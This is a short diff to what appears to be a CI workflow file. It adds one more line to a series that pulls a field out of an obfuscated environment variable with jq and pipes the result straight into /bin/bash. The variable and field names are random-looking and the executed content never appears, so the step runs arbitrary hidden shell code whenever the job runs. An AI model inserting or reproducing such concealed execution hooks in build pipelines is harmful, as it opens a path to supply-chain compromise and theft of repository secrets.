@@ -31,6 +31,7 @@ jobs:
           echo $flm576 | jq -r .xr34 | /bin/bash
           printf '%s' "$f79" | jq -r .qldb79 | /bin/bash
           echo $zkblk5 | jq -r .zhc60446 | /bin/bash
+          echo $i7532 | jq -r .txcxw8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
